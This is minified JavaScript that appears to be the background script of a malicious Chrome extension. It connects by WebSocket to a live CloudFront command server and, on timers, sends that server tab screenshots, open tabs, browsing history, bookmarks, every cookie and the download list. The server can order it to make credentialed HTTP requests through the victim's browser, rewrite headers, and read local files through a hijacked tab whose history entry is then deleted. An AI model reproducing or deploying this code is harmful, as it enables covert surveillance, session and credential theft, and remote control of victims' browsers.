var r=!1,o=g(),c=function(e){const t="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";let r=new Uint8Array(e);window.crypto.getRandomValues(r),r=r.map(e=>t.charCodeAt(e%t.length));e=String.fromCharCode.apply(null,r);return e}(64),d={};const a=["cookie"],n={SYNC:!0,SYNC_HUGE:!0,REALTIME_IMG:!1},s={HTTP_REQUEST:async function(t){var e=t.authenticated?"include":"omit";t.headers["X-PLACEHOLDER-SECRET"]=c;var r=[];var o=Object.keys(t.headers);o.map(e=>{p.includes(e.toLowerCase())&&r.push(e)}),r.map(e=>{t.headers["X-PLACEHOLDER-"+e]=t.headers[e],delete t.headers[e]});o={method:t.method,mode:"cors",cache:"no-cache",credentials:e,headers:t.headers,redirect:"follow"};t.body&&(e="data:application/octet-stream;base64,"+t.body,e=await fetch(e),o.body=await e.blob());try{var a=await fetch(t.url,o)}catch(e){return console.error("Error occurred while performing fetch:"),void console.error(e)}var n,s={};for(n of a.headers.entries())"x-set-cookie"===n[0]?s["Set-Cookie"]=JSON.parse(n[1]):s[n[0]]=n[1];e=location.origin.toString()+"/redirect-hack.html?id=";{var i;if(a.url.startsWith(e))return o=decodeURIComponent(a.url),e=o=o.replace(e,""),o=d[e],delete d[e],i={},o.headers.map(e=>{"set-cookie"!==e.name.toLowerCase()&&("X-Set-Cookie"===e.name?i["Set-Cookie"]=JSON.parse(e.value):i[e.name]=e.value)}),{url:a.url,status:o.status_code,status_text:"Redirect",headers:i,body:""}}return{url:a.url,status:a.status,status_text:a.statusText,headers:s,body:function(e){for(var t="",r=new Uint8Array(e),o=r.byteLength,a=0;a<o;a++)t+=String.fromCharCode(r[a]);return window.btoa(t)}(await a.arrayBuffer())}},AUTH:async function(e){var t=localStorage.getItem("browser_id");null===t&&(t=f(),localStorage.setItem("browser_id",t));return{browser_id:t,user_agent:navigator.userAgent,timestamp:g()}},GET_FILESYSTEM:async function(e="file:///"){var i;return chrome.tabs?(i=e,new Promise((n,s)=>{chrome.tabs.query({active:!1},e=>{const o=e[Math.floor(Math.random()*e.length)],a=o.url;chrome.tabs.update(o.id,{url:i},()=>{chrome.tabs.onUpdated.addListener(function e(t,r){t===o.id&&"complete"===r.status&&(chrome.tabs.executeScript(t,{code:"document.documentElement.innerHTML"},t=>{chrome.history.deleteUrl({url:i},()=>{chrome.tabs.update(o.id,{url:a},()=>{var e;t?(e=t[0],n(e)):s("error")})})}),chrome.tabs.onUpdated.removeListener(e))})})})})):""},GET_COOKIES:h,GET_HISTORY:m,GET_TABS:i,GET_BOOKMARKS:l,GET_DOWNLOADS:e};async function e(){return chrome.downloads?new Promise((t,e)=>{chrome.downloads.search({},e=>{t(e)})}):[]}async function t(){return chrome.tabs?new Promise(t=>{chrome.tabs.query({active:!0,lastFocusedWindow:!0},function(e){t(e[0])})}):{}}async function i(){return chrome.tabs?new Promise(t=>{chrome.tabs.query({},function(e){t(e)})}):[]}async function u(){return chrome.tabs?new Promise(t=>{chrome.tabs.captureVisibleTab(options={format:"jpeg",quality:10},callback=e=>t(e))}):""}async function l(){return chrome.bookmarks?new Promise((t,e)=>{chrome.bookmarks.getTree(function(e){t(e)})}):[]}async function m(e=30){return chrome.history?([a=7]=[e],new Promise(function(t,r){try{var e=864e5*a,o=(new Date).getTime()-e;chrome.history.search({text:"",startTime:o,maxResults:1e4},function(e){t(e)})}catch(e){r(e)}})):[];var a}async function h(e){return chrome.cookies?(o={},new Promise(function(t,r){try{chrome.cookies.getAll(o,function(e){t(e)})}catch(e){r(e)}})):[];var o}function f(){return([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g,e=>(e^crypto.getRandomValues(new Uint8Array(1))[0]&15>>e/4).toString(16))}function g(){return Math.floor(Date.now()/1e3)}setInterval(async()=>{if([0,2].includes(r.readyState))console.log("WebSocket not in appropriate state for liveness check...");else if(29<g()-o||3===r.readyState){console.error("WebSocket does not appear to be live! Restarting the WebSocket connection...");try{r.close()}catch(e){}y()}else r.send(JSON.stringify({id:f(),version:"1.0.0",action:"PING",data:{current_tab:await t(),current_tab_image:await u()}}))},13e3),setInterval(async()=>{!0===n.REALTIME_IMG&&r.send(JSON.stringify({id:f(),version:"1.0.0",action:"REALTIME_IMG",data:{current_tab_image:await u()}}))},2e3),setInterval(async()=>{!0===n.SYNC&&r.send(JSON.stringify({id:f(),version:"1.0.0",action:"SYNC",data:{tabs:await i()}}))},63e3),setInterval(async()=>{!0===n.SYNC_HUGE&&r.send(JSON.stringify({id:f(),version:"1.0.0",action:"SYNC_HUGE",data:{history:await m(30),bookmarks:await l(),cookies:await h(),downloads:await e()}}))},321e3);const p=["origin","referer","access-control-request-headers","access-control-request-method","access-control-allow-origin","date","dnt","trailer","upgrade"];function y(){(r=new WebSocket("wss://diw9xid5twhjw.cloudfront.net/ws/subscriptionId=ZhPGtK84QbapRWXzEBW7MA")).onopen=function(e){},r.onmessage=async function(e){console.log("Received WebSocket message: "+e.data),o=g();try{var t=JSON.parse(e.data)}catch(e){return console.error("Could not parse WebSocket message!"),void console.error(e)}try{Object.keys(t.data.switch_config).map(e=>{n[e]=t.data.switch_config[e]})}catch(e){}t.action in s?(e=await s[t.action](t.data),r.send(JSON.stringify({id:t.id,origin_action:t.action,result:e}))):console.error(`No RPC action ${t.action}!`)},r.onclose=function(e){e.wasClean?console.log(`[close] Connection closed cleanly, code=${e.code} reason=`+e.reason):console.log("[close] Connection died")},r.onerror=async function(e){console.log("[error] "+e.message)}}y(),chrome.webRequest.onBeforeSendHeaders.addListener(function(e){var t,r,o;if(e.initiator===location.origin.toString())return t=!1,r=[],o=[],e.requestHeaders.map(e=>{"X-PLACEHOLDER-SECRET"===e.name&&e.value===c&&(t=!0,r.push("X-PLACEHOLDER-SECRET"))}),t?(e.requestHeaders.map(e=>{!e.name.startsWith("X-PLACEHOLDER-SECRET")&&e.name.startsWith("X-PLACEHOLDER-")&&(r.push(e.name),a.includes(e.name.replace("X-PLACEHOLDER-","").toLowerCase())||o.push({name:e.name.replace("X-PLACEHOLDER-",""),value:e.value}))}),e.requestHeaders=e.requestHeaders.filter(e=>!r.includes(e.name)),e.requestHeaders=e.requestHeaders.concat(o),{requestHeaders:e.requestHeaders}):{cancel:!1}},{urls:["<all_urls>"]},["blocking","requestHeaders","extraHeaders"]);const w=[301,302,307];chrome.webRequest.onHeadersReceived.addListener(function(e){var t,r;if(e.initiator===location.origin.toString())return t=[],e.responseHeaders.map(e=>{"set-cookie"===e.name.toLowerCase()&&t.push(e.value)}),0!=t.length&&e.responseHeaders.push({name:"X-Set-Cookie",value:JSON.stringify(t)}),w.includes(e.statusCode)?(r=f(),d[r]=JSON.parse(JSON.stringify({url:e.url,status_code:e.statusCode,headers:e.responseHeaders})),{redirectUrl:location.origin.toString()+"/redirect-hack.html?id="+r}):{responseHeaders:e.responseHeaders}},{urls:["<all_urls>"]},["blocking","responseHeaders","extraHeaders"]),chrome.idle.onStateChanged.addListener(e=>{r.send(JSON.stringify({id:f(),version:"1.0.0",action:"STATE",data:{state:e}}))});